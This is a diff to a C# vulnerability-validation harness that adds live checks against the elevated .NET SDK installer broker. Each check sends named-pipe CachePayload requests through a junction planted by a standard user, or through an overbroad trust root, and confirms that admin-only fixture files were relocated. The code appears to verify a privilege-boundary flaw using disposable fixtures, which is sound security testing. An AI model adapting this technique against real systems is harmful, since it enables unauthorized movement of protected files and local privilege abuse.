@@ -455,6 +455,32 @@ internal static class Program
                         "The real SDK broker modified a disposable admin-only canary using a junction created by a separate standard user.",
                         "No UAC approval or standard-user IPC connection occurred; this tests distinct filesystem principals only.");
 
+                    // Phase 5: genuine named-pipe CachePayload, not a reflection-only helper.
+                    // Source was placed by the test owner under an admin-only isolated directory.
+                    // The parent link was planted by a different standard user in its client root.
+                    string cacheId = Environment.GetEnvironmentVariable("BROKER_CROSS_CACHE_JUNCTION_ID")
+                        ?? throw new InvalidOperationException("Missing randomized fixture cache package ID");
+                    string manifestViaLink=Path.Combine(clientDir,"junction","fixture-junction.msi.json");
+                    object cacheReply=ReadResponse(request,JsonSerializer.Serialize(new {
+                        RequestType=100,PackageId=cacheId,PackageVersion="1.0.0",ManifestPath=manifestViaLink
+                    }));
+                    string installedCache=Path.Combine(
+                        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
+                        "dotnet","workloads",cacheId,"1.0.0");
+                    string cachedSecret=Path.Combine(installedCache,"fixture-admin-only.dat");
+                    bool sourceGone=!File.Exists(Path.Combine(outsideDir,"fixture-admin-only.dat")) &&
+                                    !File.Exists(Path.Combine(outsideDir,"fixture-junction.msi.json"));
+                    bool newFiles=File.Exists(cachedSecret) &&
+                                  File.Exists(Path.Combine(installedCache,"fixture-junction.msi.json"));
+                    Check("12-standard-created-junction-live-broker-cache-moved",
+                        ErrorOf(cacheReply)==0 && sourceGone && newFiles,
+                        "The ACTUAL elevated SDK broker relocated an admin-only disposable payload/manifest through a junction planted by a different standard user.",
+                        "IPC client was still preauthorized admin harness; no interactive UAC, no production file, and no arbitrary MSI installation.");
+                    Sessions.Add(new {sdkVersion,label,brokerPID=broker.Id,brokerIdentity,
+                        requestType="CachePayload",cacheId,sourceManifest=manifestViaLink,
+                        physicalSourceRoot=outsideDir,isolatedCacheDestination=installedCache,
+                        physicalSourceDeleted=sourceGone,cacheFilesPresent=newFiles,brokerReply=cacheReply});
+
                     string provider = Environment.GetEnvironmentVariable("BROKER_CROSS_PROVIDER")
                         ?? throw new InvalidOperationException("Missing BROKER_CROSS_PROVIDER fixture name");
                     string dependent = "FixtureDependent." + Guid.NewGuid().ToString("N");
@@ -490,6 +516,29 @@ internal static class Program
                 }
                 else
                 {
+                    // #11: a different admin-only source, reachable by the deliberately broadened
+                    // --client-temp root without a reparse point; same genuine broker cache sink.
+                    string broadCacheId=Environment.GetEnvironmentVariable("BROKER_CROSS_CACHE_BROAD_ID")
+                        ?? throw new InvalidOperationException("Missing broad-root cache fixture ID");
+                    string broadSource=Path.Combine(outsideDir,"fixture-broad.msi.json");
+                    object broadCacheReply=ReadResponse(request,JsonSerializer.Serialize(new {
+                        RequestType=100,PackageId=broadCacheId,PackageVersion="1.0.0",ManifestPath=broadSource
+                    }));
+                    string broadCacheDir=Path.Combine(
+                        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
+                        "dotnet","workloads",broadCacheId,"1.0.0");
+                    bool broadSourceGone=!File.Exists(broadSource) &&
+                                         !File.Exists(Path.Combine(outsideDir,"fixture-broad-only.dat"));
+                    bool broadCopied=File.Exists(Path.Combine(broadCacheDir,"fixture-broad.msi.json")) &&
+                                     File.Exists(Path.Combine(broadCacheDir,"fixture-broad-only.dat"));
+                    Check("11-broad-root-live-broker-admin-cache-moved",
+                        ErrorOf(broadCacheReply)==0 && broadSourceGone && broadCopied,
+                        "The actual elevated broker relocated a protected disposable payload outside the ordinary client temp after receiving an overbroad trust root.",
+                        "No UAC approval or low-user IPC; physical source and cache paths restricted to self-created fixtures.");
+                    Sessions.Add(new {sdkVersion,label,brokerPID=broker.Id,brokerIdentity,
+                        requestType="CachePayload",cacheId=broadCacheId,sourceManifest=broadSource,
+                        physicalSourceDeleted=broadSourceGone,cacheFilesPresent=broadCopied,brokerReply=broadCacheReply});
+
                     uint broadError=Uninstall(protectedCanary);
                     bool changed=File.ReadAllText(protectedCanary)!=markerBefore;
                     Check("11-overbroad-root-admin-only-canary-modified",broadError==1605 && changed,
